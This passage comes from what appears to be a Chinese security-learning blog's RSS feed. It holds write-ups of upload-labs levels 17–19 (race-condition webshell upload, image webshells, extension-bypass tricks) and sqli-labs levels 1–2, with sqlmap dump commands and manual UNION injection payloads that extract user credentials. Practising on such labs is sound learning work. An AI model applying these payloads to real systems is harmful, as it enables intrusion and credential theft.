&lt;h2 id=&#34;总结-16&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-16&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;过过过&lt;/p&gt;
&lt;h1 id=&#34;pass-17&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-17&#34;&gt;#&lt;/a&gt; Pass-17&lt;/h1&gt;
&lt;h2 id=&#34;过程-17&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-17&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;看源码，是先上传文件移动到 upload 文件夹后，再对后缀进行判断，判断允许后重命名文件再删除原来的文件，否则直接删除文件&lt;/p&gt;
&lt;p&gt;那就搞文件竞争，在上传文件和删除文件之间的时间，进行访问上传的文件，并且通过上传的文件创建新的木马&lt;/p&gt;
&lt;p&gt;利用 py 脚本不断访问上传的 haha.php&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requestswhile &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;:    requests.get(&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://www.upload-labs.com/upload-labs/upload/haha.php&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;a href=&#34;http://xn--request-fy3l308svi7bxjr.py&#34;&gt;然后运行 request.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;然后不断点击发包&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-17-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-17-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-17-03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-17&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-17&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;抄作业的感觉，唉&lt;/p&gt;
&lt;h1 id=&#34;pass-18&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-18&#34;&gt;#&lt;/a&gt; Pass-18&lt;/h1&gt;
&lt;h2 id=&#34;过程-18&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-18&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;源代码中，先检查了后缀，大小等等，再上传，再重命名&lt;/p&gt;
&lt;p&gt;它检查后缀用的白名单，所以试一下截断➕竞争&lt;/p&gt;
&lt;p&gt;想法很美好，现实很骨感，看报错信息，是卡在文件名后缀上了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-18-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以直接和之前一样上传图片马哈哈哈&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-18-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;再用文件包含之类的配合…&lt;/p&gt;
&lt;h2 id=&#34;总结-18&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-18&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;世上无难事只要肯放弃&lt;/p&gt;
&lt;p&gt;值得注意的是这里也可以将 php 文件后缀名更改为.php.7z，因为白名单中允许上传.7z 的文件，但是 apache 又不能解析这个格式，所以会把该文件当 php 的格式解析&lt;/p&gt;
&lt;h1 id=&#34;pass-19&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-19&#34;&gt;#&lt;/a&gt; Pass-19&lt;/h1&gt;
&lt;h2 id=&#34;过程-19&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-19&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;可以自定义名称&lt;/p&gt;
&lt;p&gt;上传 a.php&lt;/p&gt;
&lt;p&gt;自定义名称 haha.php.&lt;/p&gt;
&lt;p&gt;因为用的黑名单，上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-19-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;大小写都能绕哈哈哈&lt;/p&gt;
&lt;h2 id=&#34;总结-19&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-19&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;哈哈哈&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/</guid>
            <title>sqli-labs基础关卡</title>
            <link>http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/</link>
            <category>sql注入靶场</category>
            <pubDate>Mon, 16 Nov 2020 21:29:27 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;less-1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-1&#34;&gt;#&lt;/a&gt; Less-1&lt;/h1&gt;
&lt;p&gt;date:2020-11-16 21:29:27&lt;/p&gt;
&lt;h2 id=&#34;过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;根据题目提示：Please input the ID as parameter with numeric value ，注入点为 id&lt;/p&gt;
&lt;h3 id=&#34;sqlmap&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap&#34;&gt;#&lt;/a&gt; sqlmap：&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;爆库:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 --dbs --batch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;爆表：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security --tables --batch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;爆字段:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security -T users --columns --batch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;爆字段值:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security -T users -C id,password,username --dump --batch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;拿到数据，别的表同理：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Database: security&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Table: users&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[13 entries]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+----+------------+----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| id | password   | username |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+----+------------+----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| 1  | Dumb       | Dumb     |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| 2  | I-kill-you | Angelina |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| 3  | p@ssword   | Dummy    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| 4  | crappy     | secure   |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| 5  | stupidity  | stupid   |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| 6  | genious    | superman |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| 7  | mob!le     | batman   |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| 8  | admin      | admin    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| 9  | admin1     | admin1   |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| 10 | admin2     | admin2   |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| 11 | admin3     | admin3   |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| 12 | dumbo      | dhakkan  |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| 14 | admin4     | admin4   |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+----+------------+----------+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;手工注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入&#34;&gt;#&lt;/a&gt; 手工注入：&lt;/h3&gt;
&lt;p&gt;先小心翼翼地试一个 id=1&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-1/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;哦豁，有数据回显&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;用 orderby 试一下要几个字段，但是发现随便 oderby 都是一样的回显…&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-1/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=2 order by 110&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;中间试了好多都没有给回应，加单引号报错看一下 sql 语句，先入为主以为是数字型的了，明明题目也写了… 蠢爆了！！！&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-1/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;输出：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;orderby 试出来是要三个字段，因为要闭合后面的单引号好麻烦就直接用 #（URL 编码 %23）注释了后面的代码，自己搞&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-1/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; order by 3 limit 1 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;输出：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-1/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; order by 4 limit 1 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;输出：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Unknown column &amp;#x27;4&amp;#x27; in &amp;#x27;order clause&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;三个字段，只输出了两个值，理所当然有一个 id 啦，所以第一个字段随便搞，后面两个字段用了输出我们要的数据，一套流程走&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;爆库，从mysql默认的数据库information_schema里找所有的数据，使用group_concat拼接：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-1/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=666666&amp;#x27; union select 1,database(),group_concat(schema_name) from information_schema.schemata %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;输出：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;第二个字段是当前数据库security，第三个字段是输出localhost所有的数据库&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;爆表：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-1/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=666666&amp;#x27; union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;输出：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:emails,referers,uagents,users&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;爆字段：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-1/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=666666&amp;#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&amp;#x27;users&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;输出：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;爆字段值：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-1/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=666666&amp;#x27; union select 1,group_concat(concat_ws(&amp;#x27;--&amp;#x27;,id,username,password)),3 from users+%23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;输出：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:1--Dumb--Dumb,2--Angelina--I-kill-you,3--Dummy--p@ssword,4--secure--crappy,5--stupid--stupidity,6--superman--genious,7--batman--mob!le,8--admin--admin,9--admin1--admin1,10--admin2--admin2,11--admin3--admin3,12--dhakkan--dumbo,14--admin4--admin4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;虽然我觉得闭合引号很麻烦，但是我就是还是想去试一下，直接在最后闭合就可以了，也不会报语法错&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-1/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;quot; order by 3 &amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​		那为什么大家闭合的时候都喜欢用&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; and &amp;#x27;1&amp;#x27;=&amp;#x27;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;画面感地理解一下函数&lt;/p&gt;
&lt;p&gt;concat_ws () 是拼接一行的数据&lt;/p&gt;
&lt;p&gt;group_concat () 是拼接一列的数据&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;因为 sql 学的就很菜，有些语法函数什么的还要百度，mysql 里 information_schema 里的，很多表名和字段名经常搞混，手工注入的时候还要去看具体的表名和字段名，超级浪费时间的，可是记一下吧很久不写又忘记了，而且数据库那么多，默认的表都不一样，还是多写题 8&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;跑 sqlmap 的时候，会给出相应的 payload，有些写得真的超级复杂，说是为了绕过把，可是有个 select 就感觉绕不过去呀，等有一天我不再是一个连脚本都不会用的菜鸡了，有机会的话，想去研读一下源码&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-2&#34;&gt;#&lt;/a&gt; Less-2&lt;/h1&gt;
&lt;p&gt;data: 2020-11-17 10:32:43&lt;/p&gt;
&lt;h2 id=&#34;过程-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-2&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;和 less-1 相比就是少闭合了两个引号罢了&lt;/p&gt;
&lt;h3 id=&#34;sqlmap-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-2&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;同 Less-1&lt;/p&gt;
&lt;h3 id=&#34;手工注入-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-2&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;判断 id 是注入点且需要三个字段：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload:http://www.sqli-labs.com/Less-2?id=1 order by 4输出：Unknown column &amp;#x27;4&amp;#x27; in &amp;#x27;order clause&amp;#x27;payload:http://www.sqli-labs.com/Less-2?id=1 order by 3输出：Your Login name:DumbYour Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;和 less-1 一样一套流程：&lt;/p&gt;
